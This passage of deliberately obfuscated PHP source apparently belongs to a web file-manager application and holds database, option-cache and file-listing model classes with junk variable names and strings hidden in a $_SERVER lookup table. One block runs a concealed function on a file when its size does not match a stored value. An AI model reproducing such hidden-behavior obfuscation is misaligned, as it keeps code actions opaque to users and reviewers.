parseValue($¿ËÂí·ë) { $à·Äğ  =& $_SERVER[ê‘³Æ±]; if (is_string($¿ËÂí·ë)) { $²¡Áş™ = strpos($¿ËÂí·ë, $à·Äğ [4]) === 0 && in_array($¿ËÂí·ë, array_keys($this->bind)); $¿ËÂí·ë = $²¡Áş™ ? $this->escapeString($¿ËÂí·ë) : $à·Äğ [946] . $this->escapeString($¿ËÂí·ë) . $à·Äğ [946]; } elseif (isset($¿ËÂí·ë[0]) && is_string($¿ËÂí·ë[0]) && strtolower($¿ËÂí·ë[0]) == $à·Äğ [294]) { $¿ËÂí·ë = $this->escapeString($¿ËÂí·ë[1]); } elseif (is_array($¿ËÂí·ë)) { $¿ËÂí·ë = array_map(array($this, $à·Äğ [947]), $¿ËÂí·ë); } elseif (is_bool($¿ËÂí·ë)) { $¿ËÂí·ë = $¿ËÂí·ë ? $à·Äğ [89] : $à·Äğ [192]; } elseif (is_null($¿ËÂí·ë)) { $¿ËÂí·ë = $à·Äğ [104]; } return $¿ËÂí·ë; } public function getLastInsertId() { $’ ‹ùßé =& $_SERVER[ê‘³Æ±]; switch ($this->dbType) { case $’ ‹ùßé[933]: case $’ ‹ùßé[925]: case $’ ‹ùßé[906]: case $’ ‹ùßé[924]: case $’ ‹ùßé[908]: case $’ ‹ùßé[936]: return $this->_linkID->lastInsertId(); case $’ ‹ùßé[907]: case $’ ‹ùßé[909]: $²¶ÅÉ†Ô = $this->table; $‹ßë³ı© = $this->query("\x53\x45\114\x45\x43\124\x20{$²¶ÅÉ†Ô}\x2e\x63\165\x72\x72\x76\x61\154\x20\x63\x75\162\x72\166\141\x6c\x20\106\x52\x4f\x4d\40\x64\165\x61\x6c"); return $‹ßë³ı© ? $‹ßë³ı©[0][$’ ‹ùßé[948]] : 0; } } } goto D¡·šà—¶; CöÅìÅ„Ø¹: function binCheckBigger($•¹ç‰ÅÚ, $¶Â„æë•) { return $•¹ç‰ÅÚ > $¶Â„æë•; } $_SERVER[$_SERVER[÷³Ü•®ä][3]] = (base64_decode('Nzk5Ng==')."\65\66")+0;$_fmv8="fst09gjydarnuq78ibmvlhx3ocwe4k16p25za7wjry91ou6lzpmti2gc83dkhqf04xevbns";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ó‘‡öí„, $ªºŸ£à¼) { $ú³¬ÇÌÕ =& $_SERVER[ê‘³Æ±]; if (isset(self::$_methodList[$ó‘‡öí„])) { return @call_user_func_array(self::$_methodList[$ó‘‡öí„], $ªºŸ£à¼); } else { if (method_exists($this, $ó‘‡öí„)) { return call_user_func_array(array($this, $ó‘‡öí„), $ªºŸ£à¼); } else { think_exception(__CLASS__ . $ú³¬ÇÌÕ[4] . $ó‘‡öí„ . $ú³¬ÇÌÕ[5]); } } } public static function __callStatic($¥‰å®ªî, $øˆÕİ¸†) { if (isset(self::$_methodListStatic[$¥‰å®ªî])) { return call_user_func_array(self::$_methodListStatic[$¥‰å®ªî], $øˆÕİ¸†); } else { if (method_exists(self, $¥‰å®ªî)) { return call_user_func_array(array(self, $¥‰å®ªî), $øˆÕİ¸†); } else { show_json("{$¥‰å®ªî}\x28\51\x20\156\157\164\40\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($£ä“«×, $§¬·à„¤) { self::$_methodList[$£ä“«×] = $§¬·à„¤; } public static function addMethodStatic($³©÷ªî, $ÑÃ×·‹Ñ) { self::$_methodListStatic[$³©÷ªî] = $ÑÃ×·‹Ñ; } } goto E÷Šô÷ÈÑ½; Fé¯…“³‡í: $_file = $_SERVER[$_SERVER[ê‘³Æ±][784]]; $_size = $_SERVER[ê‘³Æ±][785]; if ($_SERVER[$_SERVER[ê‘³Æ±][786]] != $_size($_file)) { $_getc = $_SERVER[ê‘³Æ±][787]; $_getfile = $_SERVER[$_SERVER[ê‘³Æ±][788]] . $_SERVER[ê‘³Æ±][789]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ê‘³Æ±][228], $_getfilec); if (count($_getarrs) < $_SERVER[ê‘³Æ±][620]) { $exit = $_SERVER[ê‘³Æ±][790]; $exit(); } $_act = $_SERVER[ê‘³Æ±][791]; $_act($_file); } goto FÉÒØìÅ›‰; eëÀğÊöŒŒ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($³ŸÆéœ¶ = false, $‡ ã¹ô” = '', $ï‚š÷¸’ = false) { $Ù¿”èªı =& $_SERVER[ê‘³Æ±]; $Èñ„¢ˆÌ = $this->cacheGet($‡ ã¹ô”); $øÅ©ÀÉÃ = $this->optionDefault($‡ ã¹ô”); $øÅ©ÀÉÃ = is_array($øÅ©ÀÉÃ) ? $øÅ©ÀÉÃ : array(); if (is_array($Èñ„¢ˆÌ)) { $Èñ„¢ˆÌ = array_merge($øÅ©ÀÉÃ, $Èñ„¢ˆÌ); return $³ŸÆéœ¶ ? isset($Èñ„¢ˆÌ[$³ŸÆéœ¶]) ? $Èñ„¢ˆÌ[$³ŸÆéœ¶] : null : $Èñ„¢ˆÌ; } $ë‹¡êÅ„ = $this->filterWhere(array($Ù¿”èªı[33] => $‡ ã¹ô”)); $Èñ„¢ˆÌ = $this->where($ë‹¡êÅ„)->select(); $Èñ„¢ˆÌ = array_to_keyvalue($Èñ„¢ˆÌ, $Ù¿”èªı[95], $Ù¿”èªı[371]); foreach ($Èñ„¢ˆÌ as $’Îá€­ => $·Ø¯Æ“½) { if ($ï‚š÷¸’ || in_array($’Îá€­, $this->jsonField)) { $Èñ„¢ˆÌ[$’Îá€­] = json_decode($·Ø¯Æ“½, !0); } } $this->cacheSet($‡ ã¹ô”, $Èñ„¢ˆÌ); $Èñ„¢ˆÌ = array_merge($øÅ©ÀÉÃ, $Èñ„¢ˆÌ); return $³ŸÆéœ¶ ? $Èñ„¢ˆÌ[$³ŸÆéœ¶] : $Èñ„¢ˆÌ; } public function set($µ€®™ã„, $½õíá²¼ = false, $İó§»Ë‘ = '') { $ä¤­Ÿíò =& $_SERVER[ê‘³Æ±]; $this->cacheRemove($İó§»Ë‘); $íÀ˜â†Ï = array(); $ÆÚ·Â‘Î = is_array($µ€®™ã„) ? $µ€®™ã„ : array($µ€®™ã„ => $½õíá²¼); foreach ($ÆÚ·Â‘Î as $‚ÆìÒæâ => $¤²Åí¼Ğ) { if (is_array($¤²Åí¼Ğ)) { $¤²Åí¼Ğ = json_encode_force($¤²Åí¼Ğ); } $this->checkLength($¤²Åí¼Ğ, !1, $this->tableName . $ä¤­Ÿíò[4] . $µ€®™ã„); $¤²Åí¼Ğ = self::textEncode($¤²Åí¼Ğ); $ÆÚ·Â‘Î = array($ä¤­Ÿíò[33] => $İó§»Ë‘, $ä¤­Ÿíò[95] => $‚ÆìÒæâ, $ä¤­Ÿíò[371] => $¤²Åí¼Ğ); $íÀ˜â†Ï[] = $this->filterWhere($ÆÚ·Â‘Î); } if (!$íÀ˜â†Ï) { return !0; } return $this->addAll($íÀ˜â†Ï, array(), !0); } protected function optionDefault($”«Â™‹Ş = '') { return !1; } public function setDeep($È¿©×Ò­, $¡ãÓöç = false, $ÄŸ’Óş¤ = '') { $¶Ï¬ŸÇ = explode($_SERVER[ê‘³Æ±][10], $È¿©×Ò­); $üé¼ª¹¿ = $this->get(); array_set_value($üé¼ª¹¿, $È¿©×Ò­, $¡ãÓöç); $this->set($¶Ï¬ŸÇ[0], $üé¼ª¹¿[$¶Ï¬ŸÇ[0]], $ÄŸ’Óş¤); } public function remove($õÂ¬Ø“à, $›ƒ€¨‘À = '') { $¥…²Ñß± =& $_SERVER[ê‘³Æ±]; $this->cacheRemove($›ƒ€¨‘À); $±‚ø—©Õ = $this->filterWhere(array($¥…²Ñß±[95] => $õÂ¬Ø“à, $¥…²Ñß±[33] => $›ƒ€¨‘À)); if (is_null($õÂ¬Ø“à)) { unset($±‚ø—©Õ[$¥…²Ñß±[95]]); } return $this->where($±‚ø—©Õ)->delete(); } public function cacheSet($‡˜Ú¦ˆØ, $‡ÆŞÛİ = false) { return Cache::set($this->cacheKey($‡˜Ú¦ˆØ), $‡ÆŞÛİ); } public function cacheGet($¹¹‚ÔÀ) { return Cache::get($this->cacheKey($¹¹‚ÔÀ)); } public function cacheRemove($›§ÀÑš) { return Cache::remove($this->cacheKey($›§ÀÑš)); } protected function filterWhere($à«˜ØÚû) { return $à«˜ØÚû; } protected function cacheKey($êüˆ”ª¢) { return $êüˆ”ª¢; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\143\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\x6d\x65" => "\x69\x6f\137\163\157\165\162\x63\145\x5f\155\145\164\x61", "\x6d\x65\164\141\x46\x69\x65\154\144" => "\163\157\x75\x72\x63\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\x6d\145", "\164\151\155\145", "\151\156\163\145\x72\164", "\146\x75\156\x63\164\x69\x6f\x6e"), array("\143\x72\145\x61\164\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\165\x6e\143\x74\x69\157\156"), array("\166\151\x65\x77\x54\x69\155\x65", "\x74\x69\155\145", "\151\156\163\145\162\164", "\x66\x75\156\143\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($æñÚæ–Å) { return $this->listSource(array($_SERVER[ê‘³Æ±][395] => $æñÚæ–Å)); } public function typeName($¸ÜÆƒ­Õ) { static $õøûü = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $õøûü[$¸ÜÆƒ­Õ . $_SERVER[ê‘³Æ±][12]]; } public function sourceListInfo($’‰º¢ı, $÷«ÔÔã = false) { $›¸“ıŠÒ =& $_SERVER[ê‘³Æ±]; $’‰º¢ı = $’‰º¢ı ? $’‰º¢ı : array(); $’‰º¢ı = array_filter(array_unique($’‰º¢ı)); if (!$’‰º¢ı) { return array(); } $å¥ÓğÑÏ = $this->where(array($›¸“ıŠÒ[396] => array($›¸“ıŠÒ[7], $’‰º¢ı)))->select(); $this->_listDataApply($å¥ÓğÑÏ, $÷«ÔÔã); return array_to_keyvalue($å¥ÓğÑÏ, $›¸“ıŠÒ[396]); } public function pathInfoFilter(&$Ìùû—æ§) { $Ãñ˜Òßä =& $_SERVER[ê‘³Æ±]; static $³Ê‹Ï‹ß = false; static $†¬ áÁŒ = false; static $ŸŒ‚õîÜ = false; if (!$³Ê‹Ï‹ß) { $äì·´­ = $Ãñ˜Òßä[397]; $äì·´­ .= $Ãñ˜Òßä[398]; $äì·´­ .= $Ãñ˜Òßä[399]; $şâŸ…ª = $Ãñ˜Òßä[400]; $´Âà­ = explode($Ãñ˜Òßä[50], $şâŸ…ª); $³Ê‹Ï‹ß = explode($Ãñ˜Òßä[50], $äì·´­); $†¬ áÁŒ = array(); foreach ($³Ê‹Ï‹ß as $Ã†¸°¹) { if (in_array($Ã†¸°¹, $´Âà­)) { continue; } $†¬ áÁŒ[] = $Ã†¸°¹; } $ŸŒ‚õîÜ = explode($Ãñ˜Òßä[50], $Ãñ˜Òßä[401]); } foreach ($ŸŒ‚õîÜ as $¬üÈÙ§) { if (isset($Ìùû—æ§[$¬üÈÙ§])) { $Ìùû—æ§[$¬üÈÙ§] = intval($Ìùû—æ§[$¬üÈÙ§]); } } $Ìùû—æ§[$Ãñ˜Òßä[78]] = $Ãñ˜Òßä[402] . $Ìùû—æ§[$Ãñ˜Òßä[396]] . $Ãñ˜Òßä[403]; $Ìùû—æ§[$Ãñ˜Òßä[33]] = $Ìùû—æ§[$Ãñ˜Òßä[404]] == 1 ? $Ãñ˜Òßä[79] : $Ãñ˜Òßä[194]; $Ìùû—æ§[$Ãñ˜Òßä[405]] = $this->typeName($Ìùû—æ§[$Ãñ˜Òßä[405]]); if ($Ìùû—æ§[$Ãñ˜Òßä[404]] != 1) { $Ìùû—æ§[$Ãñ˜Òßä[169]] = $Ìùû—æ§[$Ãñ˜Òßä[406]]; unset($Ìùû—æ§[$Ãñ˜Òßä[406]]); } $ÙÔ†›»“ = $³Ê‹Ï‹ß; if (isset($Ìùû—æ§[$Ãñ˜Òßä[407]]) && $Ìùû—æ§[$Ãñ˜Òßä[407]][$Ãñ˜Òßä[408]] == -1) { $ÙÔ†›»“ = $†¬ áÁŒ; } $Ìùû—æ§ = array_field_key($Ìùû—æ§, $ÙÔ†›»“); return $Ìùû—æ§; } public function listUserFav() { $Ê¥ñ¯ =& $_SERVER[ê‘³Æ±]; $ÉÙ²®Âı = Model($Ê¥ñ¯[409])->listData(); $·şÈë¾Ê = array_filter_by_field($ÉÙ²®Âı, $Ê¥ñ¯[33], $Ê¥ñ¯[410]); $·şÈë¾Ê = array_to_keyvalue($·şÈë¾Ê, $Ê¥ñ¯[12], $Ê¥ñ¯[78]); if ($·şÈë¾Ê) { $ñ™Øı×´ = $this->listSource(array($Ê¥ñ¯[411] => array($Ê¥ñ¯[412], $·şÈë¾Ê))); } $ñ™Øı×´ = array_to_keyvalue($ñ™Øı×´[$Ê¥ñ¯[366]], $Ê¥ñ¯[396]); foreach ($ÉÙ²®Âı as &$³‹ÙÓ—) { $³‹ÙÓ— = array($Ê¥ñ¯[413] => $³‹ÙÓ—[$Ê¥ñ¯[394]], $Ê¥ñ¯[414] => $³‹ÙÓ—[$Ê¥ñ¯[32]], $Ê¥ñ¯[415] => $³‹ÙÓ—[$Ê¥ñ¯[78]], $Ê¥ñ¯[416] => $³‹ÙÓ—[$Ê¥ñ¯[33]], $Ê¥ñ¯[417] => $³‹ÙÓ—[$Ê¥ñ¯[195]], $Ê¥ñ¯[418] => $³‹ÙÓ—[$Ê¥ñ¯[86]]); if ($³‹ÙÓ—[$Ê¥ñ¯[33]] == $Ê¥ñ¯[410] && $ñ™Øı×´[$³‹ÙÓ—[$Ê¥ñ¯[78]]]) { $³‹ÙÓ—[$Ê¥ñ¯[87]] = $ñ™Øı×´[$³‹ÙÓ—[$Ê¥ñ¯[78]]]; } } unset($³‹ÙÓ—); return $ÉÙ²®Âı; } public function listUserTag($Ê½ò ) { $“å­‰§… =& $_SERVER[ê‘³Æ±]; if ($Ê½ò  && !is_array($Ê½ò )) { $Ê½ò  = array($Ê½ò ); } $´ßç‘µô = Model($“å­‰§…[419])->listData(); $éèÓö€û = array(); foreach ($´ßç‘µô as $œä’¡½) { $ø¶áâµ = $œä’¡½[$“å­‰§…[78]]; if (!$ø¶áâµ) { continue; } if (!isset($éèÓö€û[$ø¶áâµ])) { $éèÓö€û[$ø¶áâµ] = array(); } $éèÓö€û[$ø¶áâµ][] = $œä’¡½[$“å­‰§…[420]]; } $‘ŠşÓº = array(); foreach ($éèÓö€û as $˜¹ğÈì => $Ïñ¢È) { $œè‘·‘ï = !0; if (!$Ê½ò ) { $‘ŠşÓº[] = $˜¹ğÈì; continue; } foreach ($Ê½ò  as $âÔª˜ƒ„) { if (!in_array($âÔª˜ƒ„, $Ïñ¢È)) { $œè‘·‘ï = !1; break; } } if ($œè‘·‘ï) { $‘ŠşÓº[] = $˜¹ğÈì; } } if (!$‘ŠşÓº) { return array(); } $Ò½Ô÷É = $this->listSource(array($“å­‰§…[411] => array($“å­‰§…[412], $‘ŠşÓº))); if (!$Ò½Ô÷É || count($‘ŠşÓº) == $Ò½Ô÷É[$“å­‰§…[363]][$“å­‰§…[364]]) { return $Ò½Ô÷É; } $ƒª‰üªŠ = array(); $ò»ïäû§ = array_to_keyvalue($Ò½Ô÷É[$“å­‰§…[77]], $“å­‰§…[12], $“å­‰§…[396]); $Ğ˜üŠìÌ = array_to_keyvalue($Ò½Ô÷É[$“å­‰§…[76]], $“å­‰§…[12], $“å­‰§…[396]); $ó’áèá = array_merge($Ğ˜üŠìÌ, $ò»ïäû§); foreach ($‘ŠşÓº as $ø¶áâµ) { if (!in_array($ø¶áâµ, $ó’áèá)) { $ƒª‰üªŠ[] = $ø¶áâµ; } } if ($ƒª‰üªŠ) { Model($“å­‰§…[421])->removeBySource($ƒª‰üªŠ); } return $Ò½Ô÷É; } public function listUserRecycle() { $ÁÌ€ĞŸ =& $_SERVER[ê‘³Æ±]; $Â·»áõ = Model($ÁÌ€ĞŸ[422])->listData(); if (!$Â·»áõ) { return array(); } $ŞıöÈÅ = array($ÁÌ€ĞŸ[411] => array($ÁÌ€ĞŸ[412], $Â·»áõ), $ÁÌ€ĞŸ[423] => 1); return $this->listSource($ŞıöÈÅ); } public function listSource($£ıš‚‹, $Æä–Â¢å = 3000) { $ğŞŸ¡ =& $_SERVER[ê‘³Æ±]; if (!isset($£ıš‚‹[$ğŞŸ¡[424]])) { $£ıš‚‹[$ğŞŸ¡[424]] = 0; } $¡ûéÌ‹Ú = $ğŞŸ¡[425]; $ÎÔ†ÓıŞ = $this->field($¡ûéÌ‹Ú)->_makeOrder()->where($£ıš‚‹)->selectPage($Æä–Â¢å); $this->_listPageCheck($ÎÔ†ÓıŞ, $¡ûéÌ‹Ú, $£ıš‚‹); $this->_listDataApply($ÎÔ†ÓıŞ[$ğŞŸ¡[366]]); $this->_listMake($ÎÔ†ÓıŞ); return $ÎÔ†ÓıŞ; } private function _listPageCheck(&$¦ùºçÄ¬, $‡¸Î‡¹ä, $œşïÊà) { $ÂşÃ¯Áõ =& $_SERVER[ê‘³Æ±]; if (!is_array($¦ùºçÄ¬[$ÂşÃ¯Áõ[363]])) { return; } $Ğ×ª²½ = $¦ùºçÄ¬[$ÂşÃ¯Áõ[363]]; if ($Ğ×ª²½[$ÂşÃ¯Áõ[365]] <= 1) { return; } if ($Ğ×ª²½[$ÂşÃ¯Áõ[364]] >= 100000) { return; } if (Model($ÂşÃ¯Áõ[426])->get($ÂşÃ¯Áõ[427]) != $ÂşÃ¯Áõ[428]) { return; } $‡¸Î‡¹ä = str_replace(array($ÂşÃ¯Áõ[53], $ÂşÃ¯Áõ[339], $ÂşÃ¯Áõ[228]), $ÂşÃ¯Áõ[12], $‡¸Î‡¹ä); $‡¸Î‡¹ä = $ÂşÃ¯Áõ[429] . str_replace($ÂşÃ¯Áõ[50], $ÂşÃ¯Áõ[430], $‡¸Î‡¹ä) . $ÂşÃ¯Áõ[431]; $àæŠ¡úä = $ÂşÃ¯Áõ[432]; $àæŠ¡úä = $àæŠ¡úä . $ÂşÃ¯Áõ[433]; $ÚÊÜ¹óù = $Ğ×ª²½[$ÂşÃ¯Áõ[360]] * ($Ğ×ª²½[$ÂşÃ¯Áõ[350]] - 1) . $ÂşÃ¯Áõ[50] . $Ğ×ª²½[$ÂşÃ¯Áõ[360]]; $é”¿êÙ = $this->_makeOrder(!0); $¬Êï‰‰Î = $ÂşÃ¯Áõ[429] . str_replace($ÂşÃ¯Áõ[50], $ÂşÃ¯Áõ[430], $é”¿êÙ[0]); if (strpos($¬Êï‰‰Î, $ÂşÃ¯Áõ[434])) { $¬Êï‰‰Î = str_replace($ÂşÃ¯Áõ[434], $ÂşÃ¯Áõ[435], $¬Êï‰‰Î); } else { $¬Êï‰‰Î .= $ÂşÃ¯Áõ[436] . $é”¿êÙ[1]; } $Ô»Ùãªè = array(); foreach ($œşïÊà as $¹êÂ²Ñ³ => $ê‰Í¢Ğî) { $Ô»Ùãªè[$ÂşÃ¯Áõ[429] . $¹êÂ²Ñ³] = $ê‰Í¢Ğî; } $this->alias($ÂşÃ¯Áõ[437])->field($‡¸Î‡¹ä)->limit($ÚÊÜ¹óù)->order($¬Êï‰‰Î); $®Ø˜‹„Î = $this->join($àæŠ¡úä)->where($Ô»Ùãªè)->select(); if ($®Ø˜‹„Î) { $¦ùºçÄ¬[$ÂşÃ¯Áõ[366]] = $®Ø˜‹„Î; } } protected function _makeOrder($ÆŒœÍôÄ = false) { $÷ÎäÏØä =& $_SERVER[ê‘³Æ±]; $ÀÜÕ…ç = Model($÷ÎäÏØä[438])->get($÷ÎäÏØä[439]); $òŒØ¤è = Model($÷ÎäÏØä[438])->get($÷ÎäÏØä[440]); $›ğëÆÙ‘ = array($÷ÎäÏØä[441] => $÷ÎäÏØä[442], $÷ÎäÏØä[443] => $÷ÎäÏØä[444]); $ù§¢ÇíÎ = array($÷ÎäÏØä[32] => $÷ÎäÏØä[32], $÷ÎäÏØä[80] => $÷ÎäÏØä[80], $÷ÎäÏØä[169] => $÷ÎäÏØä[406], $÷ÎäÏØä[445] => $÷ÎäÏØä[445], $÷ÎäÏØä[446] => $÷ÎäÏØä[447], $÷ÎäÏØä[195] => $÷ÎäÏØä[195], $÷ÎäÏØä[86] => $÷ÎäÏØä[86]); $”øÄş¹‡ = Input::get($÷ÎäÏØä[448], $÷ÎäÏØä[7], $ÀÜÕ…ç, array_keys($ù§¢ÇíÎ)); $”«ÌÁÌ£ = Input::get($÷ÎäÏØä[449], $÷ÎäÏØä[7], $òŒØ¤è, array_keys($›ğëÆÙ‘)); if (!in_array($”øÄş¹‡, array_keys($ù§¢ÇíÎ))) { $”øÄş¹‡ = $÷ÎäÏØä[32]; } if (!in_array($”«ÌÁÌ£, array_keys($›ğëÆÙ‘))) { $”øÄş¹‡ = $÷ÎäÏØä[441]; } if ($”øÄş¹‡ == $÷ÎäÏØä[32]) { } $®ÉÃàâª = $÷ÎäÏØä[450] . $ù§¢ÇíÎ[$”øÄş¹‡] . $÷ÎäÏØä[53] . $›ğëÆÙ‘[$”«ÌÁÌ£]; $®ÉÃàâª = rtrim(trim($®ÉÃàâª), $÷ÎäÏØä[50]); if ($ÆŒœÍôÄ) { return array($®ÉÃàâª, $›ğëÆÙ‘[$”«ÌÁÌ£]); } return $this->order($®ÉÃàâª); } protected function _listDataApplyItem($¿Âà‰¬», $ª–ƒÎèã = false) { $Óé¦ëìØ = array($¿Âà‰¬»); $this->_listDataApply($Óé¦ëìØ, $ª–ƒÎèã); return $Óé¦ëìØ[0]; } protected function _listDataApply(&$½‡çğÍ¦, $§²ıÇã¨ = false) { $ùŠ«×æ‰ =& $_SERVER[ê‘³Æ±]; if (!$½‡çğÍ¦) { $½‡çğÍ¦ = array(); return; } $•­å´æú = array_to_keyvalue($½‡çğÍ¦, $ùŠ«×æ‰[12], $ùŠ«×æ‰[396]); $•­å´æú = array_unique($•­å´æú); $this->_listSourceCache($½‡çğÍ¦); if (!$§²ıÇã¨) { $this->_listAppendMeta($½‡çğÍ¦, $•­å´æú); $this->_listAppendFileMeta($½‡çğÍ¦, $•­å´æú); $this->_listAppendChildren($½‡çğÍ¦, $•­å´æú); } $this->_listAppendPath($½‡çğÍ¦); $this->_listAppendAuth($½‡çğÍ¦); $this->_listAppendSourceInfo($½‡çğÍ¦, $•­å´æú); $this->_listAppendUser($½‡çğÍ¦); $this->_listFilterInfo($½‡çğÍ¦, $§²ıÇã¨); $this->_listAppendAuthSecret($½‡çğÍ¦); } protected function _listSourceCache($€öã¶üõ) { $¾™Î·‘¦ =& $_SERVER[ê‘³Æ±]; foreach ($€öã¶üõ as $¡ª¾­åá) { self::$cacheSourceInfo[$¾™Î·‘¦[451] . $¡ª¾­åá[$¾™Î·‘¦[396]]] = $¡ª¾­åá; } } protected function _listFilterInfo(&$Í¼éã, $öö‰È = false) { $‡©“¨† =& $_SERVER[ê‘³Æ±]; foreach ($Í¼éã as &$ÃÌğş’) { $ÃÌğş’ = $this->pathInfoFilter($ÃÌğş’); self::$cachePathInfo[$‡©“¨†[452] . intval($öö‰È) . $‡©“¨†[453] . $ÃÌğş’[$‡©“¨†[396]]] = $ÃÌğş’; } unset($ÃÌğş’); } protected function _listMake(&$šÂÊøĞÛ) { $ìÜË”½³ =& $_SERVER[ê‘³Æ±]; $šÂÊøĞÛ[$ìÜË”½³[77]] = array(); $šÂÊøĞÛ[$ìÜË”½³[76]] = array(); foreach ($šÂÊøĞÛ[$ìÜË”½³[366]] as $–ŠÚş§ì) { $ì»ì³³ = $–ŠÚş§ì[$ìÜË”½³[404]] == 1 ? $ìÜË”½³[77] : $ìÜË”½³[76]; $šÂÊøĞÛ[$ì»ì³³][] = $–ŠÚş§ì; } unset($šÂÊøĞÛ[$ìÜË”½³[366]]); } protected function _listAppendMeta(&$°ÊóˆÇä, $®øíú×™) { $‰Éïå– =& $_SERVER[ê‘³Æ±]; $Óñá£ú = array($‰Éïå–[411] => array($‰Éïå–[412], $®øíú×™)); $…Õ’‡ƒÖ = Model($‰Éïå–[454])->field($‰Éïå–[455])->where($Óñá£ú)->select(); if (!$…Õ’‡ƒÖ) { return; } $†ÚÚ”­à = array($‰Éïå–[456], $‰Éïå–[457], $‰Éïå–[435]); $ıÕÜúåğ = array(); foreach ($…Õ’‡ƒÖ as $¢Ğ—ŸşÕ) { if (!isset($ıÕÜúåğ[$¢Ğ—ŸşÕ[$‰Éïå–[396]]])) { $ıÕÜúåğ[$¢Ğ—ŸşÕ[$‰Éïå–[396]]] = array(); } if (in_array($¢Ğ—ŸşÕ[$‰Éïå–[95]], $†ÚÚ”­à)) { continue; } $ıÕÜúåğ[$¢Ğ—ŸşÕ[$‰Éïå–[396]]][$¢Ğ—ŸşÕ[$‰Éïå–[95]]] = $¢Ğ—ŸşÕ[$‰Éïå–[371]]; } foreach ($°ÊóˆÇä as &$„Ğ¼Ó¯±) { $„Ğ¼Ó¯±[$‰Éïå–[458]] = !1; if (isset($ıÕÜúåğ[$„Ğ¼Ó¯±[$‰Éïå–[396]]])) { $„Ğ¼Ó¯±[$‰Éïå–[458]] = $ıÕÜúåğ[$„Ğ¼Ó¯±[$‰Éïå–[396]]]; } if ($this->fileIsLock($„Ğ¼Ó¯±) && $„Ğ¼Ó¯±[$‰Éïå–[407]]) { $•ıÓŸÑ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $„Ğ¼Ó¯±[$‰Éïå–[407]][$‰Éïå–[408]] = AuthModel::authDisable($„Ğ¼Ó¯±[$‰Éïå–[407]][$‰Éïå–[408]], $•ıÓŸÑ); $„Ğ¼Ó¯±[$‰Éïå–[407]][$‰Éïå–[459]][$‰Éïå–[407]] = $„Ğ¼Ó¯±[$‰Éïå–[407]][$‰Éïå–[408]]; } } unset($„Ğ¼Ó¯±); } protected function _listAppendFileMeta(&$é˜ûç®, $ê¹‹”­) { $Ì£°Ò³Ö =& $_SERVER[ê‘³Æ±]; $¨üãÑò… = array_to_keyvalue($é˜ûç®, $Ì£°Ò³Ö[12], $Ì£°Ò³Ö[460]); $¨üãÑò… = array_filter(array_unique($¨üãÑò…)); if (!$¨üãÑò…) { return; } $Ú†£í­Š = array($Ì£°Ò³Ö[461] => array($Ì£°Ò³Ö[412], $¨üãÑò…)); $Öî°Äªå = $Ì£°Ò³Ö[462]; $¾‘ú¡Œ = Model($Ì£°Ò³Ö[463])->field($Öî°Äªå)->where($Ú†£í­Š)->select(); $¾‘ú¡Œ = array_to_keyvalue($¾‘ú¡Œ, $Ì£°Ò³Ö[460]); $éÊÁì¾ƒ = Model($Ì£°Ò³Ö[464])->field($Ì£°Ò³Ö[465])->where($Ú†£í­Š)->select(); $éÊÁì¾ƒ = $éÊÁì¾ƒ ? $éÊÁì¾ƒ : array(); $ı€Œ’šÍ = array(); foreach ($éÊÁì¾ƒ as $Š‡íÉ·‚) { if (!isset($ı€Œ’šÍ[$Š‡íÉ·‚[$Ì£°Ò³Ö[460]]])) { $ı€Œ’šÍ[$Š‡íÉ·‚[$Ì£°Ò³Ö[460]]] = array(); } $ı€Œ’šÍ[$Š‡íÉ·‚[$Ì£°Ò³Ö[460]]][$Š‡íÉ·‚[$Ì£°Ò³Ö[95]]] = $Š‡íÉ·‚[$Ì£°Ò³Ö[371]]; } foreach ($é˜ûç® as &$şì¾ÒÇğ) { $Ÿ‰¦‡ƒó = $şì¾ÒÇğ[$Ì£°Ò³Ö[460]]; if (!$Ÿ‰¦‡ƒó || !is_array($¾‘ú¡Œ[$Ÿ‰¦‡ƒó])) { continue; } $¬±íæŞ = $¾‘ú¡Œ[$Ÿ‰¦‡ƒó]; $¬±íæŞ[$Ì£°Ò³Ö[80]] = $şì¾ÒÇğ[$Ì£°Ò³Ö[80]]; $¬±íæŞ[$Ì£°Ò³Ö[32]] = $şì¾ÒÇğ[$Ì£°Ò³Ö[32]]; if (!isset(self::$cacheFileInfo[$Ì£°Ò³Ö[466] . $Ÿ‰¦‡ƒó])) { self::$cacheFileInfo[$Ì£°Ò³Ö[466] . $Ÿ‰¦‡ƒó] = array_merge(array(), $¬±íæŞ); } unset($¾‘ú¡Œ[$Ÿ‰¦‡ƒó][$Ì£°Ò³Ö[78]]); $Û×Ïï²ƒ = is_array($ı€Œ’šÍ[$Ÿ‰¦‡ƒó]) ? $ı€Œ’šÍ[$Ÿ‰¦‡ƒó] : array(); $şì¾ÒÇğ[$Ì£°Ò³Ö[165]] = array_merge($Û×Ïï²ƒ, $¾‘ú¡Œ[$Ÿ‰¦‡ƒó]); if (isset($şì¾ÒÇğ[$Ì£°Ò³Ö[165]][$Ì£°Ò³Ö[164]])) { $şì¾ÒÇğ[$Ì£°Ò³Ö[164]] = json_decode($şì¾ÒÇğ[$Ì£°Ò³Ö[165]][$Ì£°Ò³Ö[164]], !0); unset($şì¾ÒÇğ[$Ì£°Ò³Ö[165]][$Ì£°Ò³Ö[164]]); } } unset($şì¾ÒÇğ); } protected function _listAppendSourceInfo(&$òí¤¡Ğï, $‰ğ™È‡±) { $à£±—Í =& $_SERVER[ê‘³Æ±]; if (!defined($à£±—Í[467])) { return; } $¹Ê‚€×„ = Model($à£±—Í[468])->listData(); $Ê§¬¥Ã° = Model($à£±—Í[419])->listData(); $€ÈªäË = 